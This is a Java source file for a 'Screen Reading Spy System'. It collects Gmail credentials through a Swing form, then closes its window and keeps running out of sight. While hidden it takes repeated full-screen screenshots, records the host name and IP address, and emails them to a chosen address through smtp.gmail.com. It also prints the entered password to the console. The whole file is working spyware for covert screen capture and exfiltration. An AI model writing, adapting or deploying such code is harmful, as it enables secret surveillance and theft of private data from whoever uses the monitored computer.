package in.ganeshsharma.ScreenReadingSpy;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.mail.*;
import javax.activation.*;
import javax.mail.internet.*;

import java.net.*;
import java.io.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.image.*;

import javax.imageio.*;
import javax.mail.PasswordAuthentication;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

public class Main 
{
	InetAddress add;
	String hostName,hostIP;
	Dimension screenSize;
	Rectangle screenRectangle;
	Robot robot;
	BufferedImage image;
	JLabel welcome,senderEmailId,lblPassword,receiverEmailId,totalSnaps,timeInterval;
	JButton submit,exit;
	JTextField txtSenderEmail,txtReceiverEmail,txtSnapsCount,txtIntervalCount;
	JPasswordField senderPassword;
	JPanel panel1,panel2,panel3;
	JFrame frame;
	Dimension d;
	String warningMessage;
	String regex = "^(.+)@(.+)$";
	Pattern pattern; 
	String username,password,receiver;
	public Main(){
		frame = new JFrame("Screen Reading Spy System");
		d = Toolkit.getDefaultToolkit().getScreenSize();
		frame.setSize(d.width/2, d.height/2);
		frame.setLocation(d.width/4,d.height/4);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setResizable(false);
		pattern = Pattern.compile(regex);
		panel1=new JPanel();
		panel2=new JPanel();
		panel3=new JPanel();
		panel1.setOpaque(true);
		panel2.setOpaque(true);
		panel3.setOpaque(true);
		panel2.setLayout(null);
		panel1.setBackground(Color.yellow);
		panel1.setForeground(Color.red);
		panel2.setBackground(Color.green);
		panel2.setForeground(Color.red);
		panel3.setBackground(Color.yellow);
		panel3.setForeground(Color.red);
		
		welcome = new JLabel("Welcome to the Screen Reading Spy System");
		senderEmailId = new JLabel("Sender Email Id : ");
		lblPassword = new JLabel("Email Password : ");
		receiverEmailId = new JLabel("Receiver Email Id : ");
		totalSnaps = new JLabel("Total No. of Snaps : ");
		timeInterval = new JLabel("Time Interval(in minutes) : ");
		txtSenderEmail = new JTextField(40);
		txtReceiverEmail = new JTextField(40);
		txtSnapsCount = new JTextField(40);
		txtSnapsCount.addKeyListener((KeyListener) new keyListener());
		txtIntervalCount = new JTextField(40);
		txtIntervalCount.addKeyListener((KeyListener) new keyListener());
		senderPassword = new JPasswordField(40);
		senderEmailId.setBounds(40, 40, 250, 30);
		txtSenderEmail.setBounds(300,40,250,30);
		lblPassword.setBounds(40,80,250,30);
		senderPassword.setBounds(300,80,250,30);
		receiverEmailId.setBounds(40,120,250,30);
		txtReceiverEmail.setBounds(300,120,250,30);
		totalSnaps.setBounds(40,160,250,30);
		txtSnapsCount.setBounds(300,160,250,30);
		timeInterval.setBounds(40,200,250,30);
		txtIntervalCount.setBounds(300,200,250,30);
		
		submit = new JButton("Submit");
		exit = new JButton("Exit");
		submit.addActionListener(new SubmitClass());
		exit.addActionListener(new ExitClass());
		panel1.add(welcome);
		panel2.add(senderEmailId);
		panel2.add(txtSenderEmail);
		panel2.add(lblPassword);
		panel2.add(senderPassword);
		panel2.add(receiverEmailId);
		panel2.add(txtReceiverEmail);
		panel2.add(totalSnaps);
		panel2.add(txtSnapsCount);
		panel2.add(timeInterval);
		panel2.add(txtIntervalCount);
		panel3.add(submit);
		panel3.add(exit);
		frame.add(panel1,BorderLayout.NORTH);
		frame.add(panel2,BorderLayout.CENTER);
		frame.add(panel3,BorderLayout.SOUTH);
		frame.setVisible(true);
	}
	public boolean isEmailCorrect(String email){
		Matcher matcher = pattern.matcher(email);
		if(matcher.matches())
			return true;
		else
			return false;
	}
	public boolean isCorrect(){
		if(txtSenderEmail.getText().trim().equals("")){
			warningMessage = "Kindly enter the senders Email ID !";
			return false;
		}
		else if(!isEmailCorrect(txtSenderEmail.getText().trim())){
			warningMessage = "Kindly enter a valid Sender Email ID !";
			return false;
		}
		else if(senderPassword.getPassword().equals(null)){
			warningMessage = "Kindly enter the password for the Email ID !";
			return false;
		}
		else if(txtReceiverEmail.getText().trim().equals("")){
			warningMessage = "Kindly enter the receiver's Email ID !";
			return false;
		}
		else if (!isEmailCorrect(txtReceiverEmail.getText().trim())){
			warningMessage = "Kindly enter a valid Receiver Email ID !";
			return false;
		}
		else if(txtSnapsCount.getText().trim().equals("")){
			warningMessage = "Kindly enter the Total No. of Snaps that you want to take";
			return false;
		}
		else if(txtIntervalCount.getText().trim().equals("")){
			warningMessage = "Kindly enter the Time Interval !";
			return false;
		}
		else
			return true;
	}
	
	class SubmitClass implements ActionListener{
		public void actionPerformed(ActionEvent ae){
			boolean status = isCorrect();
			if (status){
				final int loop = Integer.parseInt(txtSnapsCount.getText().trim());
				final int sleepTime = Integer.parseInt(txtIntervalCount.getText().trim());
				username = txtSenderEmail.getText().trim();
				password = new String (senderPassword.getPassword());
				receiver = txtReceiverEmail.getText().trim();
				System.out.println("Loop : "+loop);
				System.out.println("sleepTime : "+sleepTime);
				System.out.println("Username : "+username);
				System.out.println("Password : "+password);
				System.out.println("Receiver : "+receiver);
				frame.dispose();
				for(int i=1;i<loop;i++)
				{
					hostInfo();
					screenShot();
					sendEmailWithTLS();
					try
					{
						Thread.sleep(60000*sleepTime);
					}catch(InterruptedException ie){ie.printStackTrace();
					//JOptionPane.showMessageDialog(null,"Invalid email or password !","Warning",JOptionPane.WARNING_MESSAGE);				
					}
				}
			}
			else{
				JOptionPane.showMessageDialog(null,warningMessage,"Warning !",JOptionPane.WARNING_MESSAGE);
			}
		}
	}
	class ExitClass implements ActionListener{
		public void actionPerformed(ActionEvent ace){
			System.exit(0);
		}
	}

public void sendEmailWithTLS()
{
		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");

		Session session = Session.getInstance(props,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
			}
		  });

		try {

			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress(username));
			message.setRecipients(Message.RecipientType.TO,
				InternetAddress.parse(receiver));
			message.setSubject("Snaps of "+hostName);

			BodyPart messageBodyPart = new MimeBodyPart();

  // Fill the message
  messageBodyPart.setText("Host Information\nHost Name : "+hostName+"\nHost IP Address : "+hostIP);

  Multipart multipart = new MimeMultipart();
  multipart.addBodyPart(messageBodyPart);

  // Part two is attachment
  BodyPart messageBodyPart2 = new MimeBodyPart();
  String filename = "snap.jpg";
  DataSource source = new FileDataSource(filename);
  messageBodyPart2.setDataHandler(new DataHandler(source));
  messageBodyPart2.setFileName(filename);
  multipart.addBodyPart(messageBodyPart2);

  // Put parts in message
  message.setContent(multipart);

  // Send the message
  Transport.send(message);
		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}
	}
public void screenShot()
{
	try
   {
   screenSize = Toolkit.getDefaultToolkit().getScreenSize();
   screenRectangle = new Rectangle(screenSize);
   robot = new Robot();
   //robot.delay(6000);
   image = robot.createScreenCapture(screenRectangle);
   ImageIO.write(image, "JPEG", new File("snap.jpg"));
   }
   catch (AWTException e) {
e.printStackTrace();
}
   catch (IOException ioe) {
ioe.printStackTrace();
}
}

public void hostInfo()
{
	try
	{
	add=InetAddress.getLocalHost();
	hostIP=add.getHostAddress();
	hostName=add.getHostName();
	}
	catch(UnknownHostException uh)
	{
	System.out.println("Could not find this computer address");
	}
}

class keyListener extends KeyAdapter {

    public void keyTyped(KeyEvent e) {
            char c = e.getKeyChar();
            if (!(Character.isDigit(c) ||
                    (c == KeyEvent.VK_BACK_SPACE) ||
                    (c == KeyEvent.VK_ENTER) ||
                    (c == KeyEvent.VK_DELETE))) {
                Toolkit.getDefaultToolkit().beep();
                JOptionPane.showMessageDialog(null, "This Field Only Accept Integer Number", "WARNING",JOptionPane.DEFAULT_OPTION);
                e.consume();
             }
        }
}//inner class closed

public static void main(String args[])
{
	new Main();
	}
}
